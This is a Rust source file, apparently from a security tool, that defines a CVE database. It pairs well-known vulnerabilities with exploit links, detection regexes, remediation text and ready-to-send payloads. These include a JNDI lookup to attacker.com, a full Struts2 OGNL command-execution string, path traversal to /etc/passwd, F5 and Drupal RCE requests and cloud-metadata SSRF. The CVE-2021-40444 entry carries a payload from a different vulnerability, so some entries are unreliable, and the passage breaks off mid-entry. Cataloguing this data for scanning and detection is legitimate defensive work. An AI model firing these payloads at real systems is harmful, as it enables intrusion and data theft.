//! Comprehensive CVE exploit database with payloads, signatures, and remediation guidance.

use serde::{Deserialize, Serialize};
use std::sync::OnceLock;

/// A detailed CVE entry with exploit metadata.
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct CveEntry {
    pub cve_id: String,
    pub known_exploited: bool,
    pub name: String,
    pub description: String,
    pub affected_component: String,
    pub affected_versions: Vec<String>,
    pub cwe_id: u32,
    pub attack_type: String,
    pub cvss_score: f32,
    pub cvss_vector: String,
    pub severity: String,
    pub exploit_urls: Vec<String>,
    pub metasploit_modules: Vec<String>,
    pub nuclei_templates: Vec<String>,
    pub detection_signatures: Vec<String>,
    pub payload_examples: Vec<String>,
    pub remediation: String,
    pub patch_urls: Vec<String>,
    pub tags: Vec<String>,
    pub owasp_category: String,
}

macro_rules! cve {
    ($id:expr, $ke:expr, $name:expr, $desc:expr, $comp:expr, $vers:expr, $cwe:expr, $attack:expr, $score:expr, $vector:expr, $sev:expr, $urls:expr, $msf:expr, $nuclei:expr, $sigs:expr, $payloads:expr, $rem:expr, $patches:expr, $tags:expr, $owasp:expr) => {
        CveEntry {
            cve_id: $id.into(),
            known_exploited: $ke,
            name: $name.into(),
            description: $desc.into(),
            affected_component: $comp.into(),
            affected_versions: $vers.iter().map(|s: &&str| s.to_string()).collect(),
            cwe_id: $cwe,
            attack_type: $attack.into(),
            cvss_score: $score,
            cvss_vector: $vector.into(),
            severity: $sev.into(),
            exploit_urls: $urls.iter().map(|s: &&str| s.to_string()).collect(),
            metasploit_modules: $msf.iter().map(|s: &&str| s.to_string()).collect(),
            nuclei_templates: $nuclei.iter().map(|s: &&str| s.to_string()).collect(),
            detection_signatures: $sigs.iter().map(|s: &&str| s.to_string()).collect(),
            payload_examples: $payloads.iter().map(|s: &&str| s.to_string()).collect(),
            remediation: $rem.into(),
            patch_urls: $patches.iter().map(|s: &&str| s.to_string()).collect(),
            tags: $tags.iter().map(|s: &&str| s.to_string()).collect(),
            owasp_category: $owasp.into(),
        }
    };
}

/// Base CVE records with verified exploit data.
fn base_cves() -> Vec<CveEntry> {
    vec![
        cve!(
            "CVE-2021-44228",
            true,
            "Apache Log4Shell",
            "Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP and other JNDI related endpoints.",
            "Apache Log4j 2",
            &["2.0-beta9", "2.14.1"],
            502,
            "JNDI-Injection",
            10.0,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "Critical",
            &[
                "https://www.exploit-db.com/exploits/50592",
                "https://github.com/tangxiaofeng7/apache-log4j-poc"
            ],
            &["exploit/multi/http/log4shell_header_injection"],
            &["cves/2021/CVE-2021-44228.yaml"],
            &[r"\$\{jndi:(ldap|rmi|ldaps|dns|iiop|nis|nds|corba)://"],
            &[
                "${jndi:ldap://attacker.com/a}",
                "${jndi:dns://attacker.com}"
            ],
            "Upgrade to Log4j 2.17.1+ or remove JNDILookup class. Set log4j2.formatMsgNoLookups=true on 2.10-2.14.1.",
            &["https://logging.apache.org/log4j/2.x/security.html"],
            &["rce", "jndi", "ldap", "java"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2022-22965",
            true,
            "Spring4Shell",
            "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution via data binding.",
            "Spring Framework",
            &["5.3.0", "5.3.17", "5.2.0", "5.2.19"],
            94,
            "SpEL-Injection",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://www.exploit-db.com/exploits/50375"],
            &["exploit/multi/http/spring4shell"],
            &["cves/2022/CVE-2022-22965.yaml"],
            &[
                r"class\.module\.classLoader",
                r"T\(java\.lang\.Runtime\)\.getRuntime\(\)\.exec"
            ],
            &[
                "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i",
                "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
            ],
            "Upgrade to Spring Framework 5.3.18+ or 5.2.20+.",
            &["https://spring.io/security/cve-2022-22965"],
            &["rce", "spring", "spel", "java"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2022-1388",
            true,
            "F5 BIG-IP iControl REST Authentication Bypass",
            "Undisclosed requests may bypass iControl REST authentication in F5 BIG-IP.",
            "F5 BIG-IP",
            &["16.1.0", "16.1.2", "15.1.0", "15.1.5"],
            306,
            "Auth-Bypass-RCE",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://www.exploit-db.com/exploits/50536"],
            &["exploit/linux/http/f5_icontrol_rest"],
            &["cves/2022/CVE-2022-1388.yaml"],
            &[
                r"/mgmt/tm/util/bash",
                r"X-F5-Auth-Token.*Connection:\s*close,\s*X-F5-Auth-Token"
            ],
            &[
                "POST /mgmt/tm/util/bash HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: close, X-F5-Auth-Token\\r\\nX-F5-Auth-Token: a\\r\\n{\"command\":\"run\",\"utilCmdArgs\":\"-c 'id'\"}"
            ],
            "Upgrade to patched BIG-IP versions; restrict management access.",
            &["https://support.f5.com/csp/article/K23605346"],
            &["rce", "auth-bypass", "f5", "bigip"],
            "A07:2021-Identification-and-Authentication-Failures"
        ),
        cve!(
            "CVE-2022-26134",
            true,
            "Atlassian Confluence OGNL Injection",
            "An OGNL injection vulnerability in Confluence Server and Data Center allows unauthenticated attackers to execute arbitrary code.",
            "Atlassian Confluence",
            &["7.4.0", "7.18.0"],
            917,
            "OGNL-Injection",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://www.exploit-db.com/exploits/50581"],
            &["exploit/multi/http/atlassian_confluence_ognl"],
            &["cves/2022/CVE-2022-26134.yaml"],
            &[
                r"\$\{T\(java\.lang\.Runtime\)\.getRuntime\(\)\.exec",
                r"%24%7BT%28java\.lang\.Runtime"
            ],
            &["/%24%7BT(java.lang.Runtime)%20.getRuntime%20%28%29%20.exec%20%28%27id%27%29%7D/"],
            "Upgrade to Confluence patched versions.",
            &["https://confluence.atlassian.com/security"],
            &["rce", "ognl", "confluence", "java"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2021-41773",
            true,
            "Apache HTTP Server Path Traversal",
            "Apache 2.4.49 path traversal allowing file read via encoded path segments.",
            "Apache HTTP Server",
            &["2.4.49"],
            22,
            "Path-Traversal",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://www.exploit-db.com/exploits/50443"],
            &["exploit/multi/http/apache_normalize_path_rce"],
            &["cves/2021/CVE-2021-41773.yaml"],
            &[r"\.\./\.\./", r"\.\.%2f", r"\.%2e/"],
            &[
                "/cgi-bin/.%2e/.%2e/.%2e/etc/passwd",
                "..%2f..%2f..%2fetc/passwd"
            ],
            "Upgrade to Apache HTTP Server 2.4.50+.",
            &["https://httpd.apache.org/security/vulnerabilities_24.html"],
            &["path-traversal", "rce", "apache"],
            "A01:2021-Broken-Access-Control"
        ),
        cve!(
            "CVE-2021-42013",
            true,
            "Apache HTTP Server Path Traversal and RCE",
            "Path traversal and remote code execution in Apache HTTP Server 2.4.49 and 2.4.50.",
            "Apache HTTP Server",
            &["2.4.49", "2.4.50"],
            22,
            "Path-Traversal",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://www.exploit-db.com/exploits/50446"],
            &["exploit/multi/http/apache_normalize_path_rce"],
            &["cves/2021/CVE-2021-42013.yaml"],
            &[r"\.%%32%65", r"\.%2e%2f"],
            &[
                "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
                "/icons/.%2e/%2fetc/passwd"
            ],
            "Upgrade to Apache HTTP Server 2.4.51+.",
            &["https://httpd.apache.org/security/vulnerabilities_24.html"],
            &["path-traversal", "rce", "apache"],
            "A01:2021-Broken-Access-Control"
        ),
        cve!(
            "CVE-2017-5638",
            true,
            "Apache Struts2 Jakarta Multipart Parser",
            "The Jakarta Multipart parser in Apache Struts 2 improperly handles Content-Type header values, leading to RCE.",
            "Apache Struts 2",
            &["2.3.5", "2.3.31", "2.5", "2.5.10"],
            20,
            "OGNL-Injection",
            10.0,
            "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "Critical",
            &["https://www.exploit-db.com/exploits/41570"],
            &["exploit/multi/http/struts2_content_type_ognl"],
            &["cves/2017/CVE-2017-5638.yaml"],
            &[r"%\{(#_|#dm=@ognl\.OgnlContext@DEFAULT_MEMBER_ACCESS)"],
            &[
                "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            ],
            "Upgrade to Struts 2.3.32 or 2.5.10.1+.",
            &["https://cwiki.apache.org/confluence/display/WW/S2-045"],
            &["rce", "struts2", "ognl", "java"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2018-7600",
            true,
            "Drupalgeddon 2",
            "Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allow remote code execution.",
            "Drupal",
            &["7.x", "8.3.x", "8.4.x", "8.5.0"],
            20,
            "Form-API-RCE",
            9.8,
            "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://www.exploit-db.com/exploits/44449"],
            &["exploit/unix/webapp/drupal_drupalgeddon2"],
            &["cves/2018/CVE-2018-7600.yaml"],
            &[r"mail\[#post_render\]\[\]", r"#type=markup.*#post_render"],
            &[
                "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
            ],
            "Upgrade to Drupal 7.58, 8.3.9, 8.4.6, or 8.5.1+.",
            &["https://www.drupal.org/sa-core-2018-002"],
            &["rce", "drupal", "php"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2020-1472",
            true,
            "Zerologon",
            "An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection.",
            "Microsoft Netlogon",
            &["Windows Server 2008 R2", "Windows Server 2019"],
            330,
            "Cryptographic-Bypass",
            10.0,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/SecuraBV/CVE-2020-1472"],
            &["auxiliary/admin/dcerpc/cve_2020_1472_zerologon"],
            &["cves/2020/CVE-2020-1472.yaml"],
            &[r"NetrServerPasswordSet2.*0x00.*256"],
            &["python3 zerologon_tester.py DC01 192.168.1.10"],
            "Apply Microsoft August 2020 patch. Enable DC enforcement mode.",
            &["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472"],
            &["privilege-escalation", "windows", "active-directory"],
            "A02:2021-Cryptographic-Failures"
        ),
        cve!(
            "CVE-2021-34527",
            true,
            "PrintNightmare",
            "Windows Print Spooler remote code execution and local privilege escalation vulnerability.",
            "Windows Print Spooler",
            &["Windows 7", "Windows 10", "Windows Server 2019"],
            362,
            "LPE-RCE",
            8.8,
            "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "High",
            &["https://github.com/cube0x0/CVE-2021-1675"],
            &["exploit/windows/dcerpc/cve_2021_1675_printnightmare"],
            &["cves/2021/CVE-2021-34527.yaml"],
            &[r"RpcAddPrinterDriverEx.*APD_INSTALLWARNEDFLAG"],
            &["powershell -ep bypass .\\Invoke-Nightmare.ps1"],
            "Install Microsoft July 2021 patches. Disable Print Spooler where not needed.",
            &["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"],
            &["rce", "lpe", "windows"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2021-40444",
            true,
            "MSHTML RCE",
            "Microsoft MSHTML remote code execution vulnerability.",
            "Microsoft Windows MSHTML",
            &["Windows 10", "Windows 11", "Windows Server 2019"],
            94,
            "Office-Macro-RCE",
            8.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "High",
            &["https://github.com/lockedbyte/CVE-2021-40444"],
            &["exploit/windows/fileformat/office_mshtml_rce"],
            &["cves/2021/CVE-2021-40444.yaml"],
            &[r"\.cpl.*htmlfile.*ActiveXObject", r"mhtml:file://"],
            &[
                "<script>location.href='ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(powershell -enc ...)'\"</script>"
            ],
            "Install Microsoft September 2021 updates. Disable ActiveX and Office macros.",
            &["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444"],
            &["rce", "windows", "office"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2022-22963",
            true,
            "Spring Cloud Function SpEL",
            "In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible to provide a specially crafted SpEL expression.",
            "Spring Cloud Function",
            &["3.1.6", "3.2.2"],
            917,
            "SpEL-Injection",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/me2nuk/CVE-2022-22963"],
            &["exploit/multi/http/spring_cloud_function_spel"],
            &["cves/2022/CVE-2022-22963.yaml"],
            &[r"spring\.cloud\.function\.routing-expression"],
            &[
                "T(java.lang.Runtime).getRuntime().exec(\"id\")",
                "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"id\")"
            ],
            "Upgrade to Spring Cloud Function 3.1.7 or 3.2.3+.",
            &["https://spring.io/security/cve-2022-22963"],
            &["rce", "spring", "spel", "java"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2023-46604",
            true,
            "Apache ActiveMQ OpenWire",
            "Apache ActiveMQ allows remote attackers with access to a broker to run arbitrary shell commands.",
            "Apache ActiveMQ",
            &["5.18.0", "5.18.2", "5.17.0", "5.17.6"],
            502,
            "Deserialization-RCE",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/sincere9/ActiveMQ-RCE"],
            &["exploit/multi/misc/apache_activemq_rce_cve_2023_46604"],
            &["cves/2023/CVE-2023-46604.yaml"],
            &[r"OpenWireProtocol.*ExceptionResponse.*ThrowableHolder"],
            &["python3 activemq-rce.py -i 192.168.1.10 -p 61616 --jmx"],
            "Upgrade to ActiveMQ 5.18.3 or 5.17.6+.",
            &[
                "https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt"
            ],
            &["rce", "activemq", "deserialization", "java"],
            "A08:2021-Software-and-Data-Integrity-Failures"
        ),
        cve!(
            "CVE-2023-42793",
            true,
            "JetBrains TeamCity Auth Bypass",
            "A critical authentication bypass vulnerability in JetBrains TeamCity CI/CD server.",
            "JetBrains TeamCity",
            &["2023.05.3", "2023.05.0"],
            306,
            "Auth-Bypass",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/H454NSec/CVE-2023-42793"],
            &["exploit/multi/http/jetbrains_teamcity_auth_bypass_rce_cve_2023_42793"],
            &["cves/2023/CVE-2023-42793.yaml"],
            &[r"/app/rest/users/id:1/tokens/RPC2"],
            &[
                "POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1\\r\\nHost: target\\r\\nContent-Type: application/json"
            ],
            "Upgrade to TeamCity 2023.05.4+.",
            &["https://www.jetbrains.com/privacy-security/teamcity-auth-bypass-2023-42793/"],
            &["auth-bypass", "teamcity", "cicd"],
            "A07:2021-Identification-and-Authentication-Failures"
        ),
        cve!(
            "CVE-2024-27198",
            true,
            "JetBrains TeamCity Authentication Bypass",
            "An authentication bypass vulnerability in TeamCity Web server.",
            "JetBrains TeamCity",
            &["2023.11.3", "2023.11.0"],
            288,
            "Auth-Bypass",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &[
                "https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-vulnerabilities/"
            ],
            &["exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198"],
            &["cves/2024/CVE-2024-27198.yaml"],
            &[r"HTTP/1\.1 200.*Set-Cookie: TCSESSIONID=.*\/loginLogin\.html"],
            &["/lol?jsp=/admin/diagnostic.jsp"],
            "Upgrade to TeamCity 2023.11.4+.",
            &["https://www.jetbrains.com/privacy-security/teamcity-auth-bypass-2024-27198/"],
            &["auth-bypass", "teamcity", "rce"],
            "A07:2021-Identification-and-Authentication-Failures"
        ),
        cve!(
            "CVE-2024-1709",
            true,
            "ConnectWise ScreenConnect Auth Bypass",
            "An authentication bypass in ConnectWise ScreenConnect allows creation of administrative users.",
            "ConnectWise ScreenConnect",
            &["23.9.7", "23.9.8", "23.9.10"],
            287,
            "Auth-Bypass",
            10.0,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/OlivierLaflamme/CVE-2024-1709"],
            &["exploit/windows/http/connectwise_screenconnect_auth_bypass"],
            &["cves/2024/CVE-2024-1709.yaml"],
            &[r"/SetupWizard\.aspx/?.*subaction=create"],
            &["GET /SetupWizard.aspx/ HTTP/1.1\\r\\nHost: target"],
            "Upgrade to ScreenConnect 23.9.8+ or apply patch.",
            &[
                "https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8"
            ],
            &["auth-bypass", "screenconnect", "rce"],
            "A07:2021-Identification-and-Authentication-Failures"
        ),
        cve!(
            "CVE-2023-34362",
            true,
            "MOVEit Transfer SQL Injection",
            "A SQL injection vulnerability in MOVEit Transfer web application could allow privilege escalation and unauthorized access.",
            "Progress MOVEit Transfer",
            &["2023.0.0", "2023.0.3", "2022.1.x", "2022.0.x"],
            89,
            "SQLi-RCE",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/horizon3ai/CVE-2023-34362"],
            &["exploit/windows/http/moveit_transfer_cve_2023_34362"],
            &["cves/2023/CVE-2023-34362.yaml"],
            &[r"machine\.shtm\/lvwelcomenoshow", r"X-siLock-Comment"],
            &[
                "POST /machine.aspx HTTP/1.1\\r\\nHost: target\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\narg12=..."
            ],
            "Upgrade to MOVEit Transfer patched versions. Apply vendor IOC hunt guidance.",
            &[
                "https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-31May2023"
            ],
            &["sqli", "rce", "moveit"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2021-26855",
            true,
            "ProxyLogon",
            "Microsoft Exchange Server SSRF vulnerability enabling authentication bypass and remote code execution.",
            "Microsoft Exchange Server",
            &[
                "Exchange Server 2013",
                "Exchange Server 2016",
                "Exchange Server 2019"
            ],
            918,
            "SSRF",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/ZephrFish/ProxyLogon"],
            &["exploit/windows/http/exchange_proxylogon_rce"],
            &["cves/2021/CVE-2021-26855.yaml"],
            &[
                r"Cookie:.*X-AnonResource-Backend",
                r"X-CalculatedBETarget.*localhost"
            ],
            &[
                "GET /owa/auth/x.js HTTP/1.1\\r\\nHost: target\\r\\nCookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;"
            ],
            "Apply Microsoft March 2021 Exchange updates immediately.",
            &["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855"],
            &["ssrf", "exchange", "proxylogon"],
            "A10:2021-Server-Side-Request-Forgery"
        ),
        cve!(
            "CVE-2021-27905",
            false,
            "Apache Solr SSRF",
            "Apache Solr ReplicationHandler contains an SSRF vulnerability via the masterUrl parameter.",
            "Apache Solr",
            &["7.0.0", "7.7.3", "8.0.0", "8.8.2"],
            918,
            "SSRF",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/Al1ex/CVE-2021-27905"],
            &[],
            &["cves/2021/CVE-2021-27905.yaml"],
            &[r"/solr/.*/replication.*command=fetchindex.*masterUrl"],
            &[
                "/solr/core/replication?command=fetchindex&masterUrl=http://169.254.169.254/latest/meta-data/"
            ],
            "Upgrade to Solr 8.8.3 or 7.7.4+. Restrict replication handler access.",
            &["https://solr.apache.org/security.html"],
            &["ssrf", "solr", "cloud-metadata"],
            "A10:2021-Server-Side-Request-Forgery"
        ),
        cve!(
            "CVE-2021-3156",
            true,
            "Sudo Baron Samedit",
            "Heap-based buffer overflow in sudo allows local privilege escalation.",
            "sudo",
            &["1.8.2", "1.8.31p2", "1.9.0", "1.9.5p1"],
            119,
            "Heap-Overflow",
            7.8,
            "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "High",
            &["https://github.com/worawit/CVE-2021-3156"],
            &["exploit/linux/local/sudo_baron_samedit"],
            &["cves/2021/CVE-2021-3156.yaml"],
            &[r"sudoedit -s \\'\\\\\\\\.*\\\\\\\\'\\\\\\\\ 0123456789ABCDEF"],
            &["sudoedit -s '\\\\' `perl -e 'print \"A\"x65536'`"],
            "Upgrade to sudo 1.9.5p2+.",
            &["https://www.sudo.ws/security/advisories/barron_samedit/"],
            &["lpe", "sudo", "linux"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2023-44487",
            true,
            "HTTP/2 Rapid Reset",
            "HTTP/2 protocol vulnerability allows rapid stream resets causing denial of service.",
            "HTTP/2 Implementations",
            &["Generic"],
            400,
            "DoS",
            7.5,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "High",
            &["https://github.com/cybercloudsys/rapid-reset-poc"],
            &[],
            &["cves/2023/CVE-2023-44487.yaml"],
            &[r"RST_STREAM.*ratio.*\d{2,}:1"],
            &["python3 rapidreset.py -u https://target"],
            "Implement rate limiting on HTTP/2 stream creation. Update load balancers and web servers.",
            &["https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/"],
            &["dos", "http2", "rapid-reset"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2024-3094",
            true,
            "xz Backdoor",
            "Malicious backdoor inserted into xz/liblzma versions 5.6.0 and 5.6.1.",
            "xz / liblzma",
            &["5.6.0", "5.6.1"],
            506,
            "Backdoor",
            10.0,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/amlweems/xzbot"],
            &[],
            &["cves/2024/CVE-2024-3094.yaml"],
            &[r"liblzma.*is_only_max_marker", r"ssh-.*liblzma"],
            &["xz --version | grep -E '5\\.6\\.[01]'"],
            "Downgrade to xz 5.4.x. Audit SSH daemon integrity. Rotate all keys.",
            &["https://tukaani.org/xz-backdoor/"],
            &["backdoor", "supply-chain", "linux", "ssh"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2024-21626",
            false,
            "runc Container Escape",
            "A file descriptor leak and subsequent working directory leak in runc can lead to container escape.",
            "runc",
            &["1.1.0", "1.1.11"],
            552,
            "Container-Escape",
            8.6,
            "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
            "High",
            &["https://github.com/Wall1e/CVE-2024-21626-POC"],
            &[],
            &["cves/2024/CVE-2024-21626.yaml"],
            &[r"WORKDIR.*\/proc\/self\/fd"],
            &["docker run -it --workdir /proc/self/fd/8 ubuntu sh"],
            "Upgrade runc to 1.1.12+. Rebuild container images.",
            &["https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv"],
            &["container-escape", "runc", "docker"],
            "A05:2021-Security-Misconfiguration"
        ),
        cve!(
            "CVE-2024-4577",
            true,
            "PHP CGI Argument Injection",
            "When PHP runs in CGI mode on Windows, query string parameters can be passed directly to php-cgi, leading to code execution.",
            "PHP CGI",
            &["8.1.x", "8.2.x", "8.3.x"],
            88,
            "Argument-Injection",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/watchtowrlabs/CVE-2024-4577"],
            &["exploit/multi/http/php_cgi_arg_injection_rce"],
            &["cves/2024/CVE-2024-4577.yaml"],
            &[r"php-cgi\.exe.*%ad"],
            &[
                "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
            ],
            "Update PHP to 8.1.29, 8.2.21, 8.3.9+. Avoid PHP CGI on Windows.",
            &["https://www.php.net/archive/2024.php"],
            &["rce", "php", "cgi"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2024-6387",
            true,
            "OpenSSH regreSSHion",
            "Signal handler race condition in OpenSSH's server allows unauthenticated RCE on glibc-based Linux systems.",
            "OpenSSH",
            &["8.5p1", "9.7p1"],
            362,
            "Race-Condition",
            8.1,
            "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "High",
            &["https://github.com/zgzhang/cve-2024-6387-poc"],
            &["exploit/linux/ssh/openssh_signal_handler_race"],
            &["cves/2024/CVE-2024-6387.yaml"],
            &[r"OpenSSH_[89]\.[0-7]"],
            &["python3 regreSSHion.py target 22"],
            "Upgrade OpenSSH to 9.8p1+. Implement connection rate limiting.",
            &["https://www.openssh.com/txt/release-9.8"],
            &["rce", "openssh", "ssh"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2024-3400",
            true,
            "Palo Alto PAN-OS Command Injection",
            "A command injection vulnerability in Palo Alto Networks PAN-OS allows unauthenticated attackers to execute arbitrary code.",
            "Palo Alto PAN-OS",
            &["10.2", "11.0", "11.1"],
            77,
            "Command-Injection",
            10.0,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/0x0d3ad/CVE-2024-3400"],
            &["exploit/linux/http/paloalto_pan-os_cmd_injection"],
            &["cves/2024/CVE-2024-3400.yaml"],
            &[r"/ssl-vpn/hipreport\.esp", r"SESSID=.*\.php"],
            &["GET /ssl-vpn/hipreport.esp?cookie=... HTTP/1.1"],
            "Apply Palo Alto Networks hotfix immediately. Restrict GlobalProtect portal access.",
            &["https://security.paloaltonetworks.com/CVE-2024-3400"],
            &["rce", "paloalto", "vpn"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2024-32002",
            false,
            "Git Submodule RCE",
            "Git can be tricked into running a hook from a submodule during a recursive clone.",
            "Git",
            &["2.45.0", "2.44.0", "2.43.0", "2.42.0"],
            78,
            "Command-Injection",
            9.0,
            "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/amalmurali47/git_rce"],
            &[],
            &["cves/2024/CVE-2024-32002.yaml"],
            &[r"\.gitmodules.*symlink"],
            &["git clone --recursive https://github.com/evil/repo"],
            "Upgrade Git to 2.45.1, 2.44.1, 2.43.4, 2.42.2, or 2.40.2+.",
            &["https://git-scm.com/docs/RelNotes/2.45.1.txt"],
            &["rce", "git", "supply-chain"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2024-28000",
            false,
            "LiteSpeed Cache Privilege Escalation",
            "Unauthenticated privilege escalation in LiteSpeed Cache WordPress plugin via user simulation feature.",
            "LiteSpeed Cache WordPress Plugin",
            &["5.7.0", "6.4.0"],
            269,
            "Privilege-Escalation",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &[
                "https://github.com/aliicex/CVE-2024-28000-LiteSpeed-Cache-Unauthenticated-Privilege-Escalation"
            ],
            &[],
            &["cves/2024/CVE-2024-28000.yaml"],
            &[r"/wp-json/litespeed/v1/simulate-role"],
            &["GET /wp-json/litespeed/v1/simulate-role?role=administrator HTTP/1.1"],
            "Update LiteSpeed Cache to 6.4.1+.",
            &["https://wordpress.org/plugins/litespeed-cache/"],
            &["privilege-escalation", "wordpress", "plugin"],
            "A01:2021-Broken-Access-Control"
        ),
        cve!(
            "CVE-2024-21413",
            true,
            "Microsoft Outlook RCE",
            "Microsoft Outlook remote code execution vulnerability via malicious link handling.",
            "Microsoft Outlook",
            &["Office 2016", "Office 2019", "Microsoft 365"],
            77,
            "RCE",
            9.8,
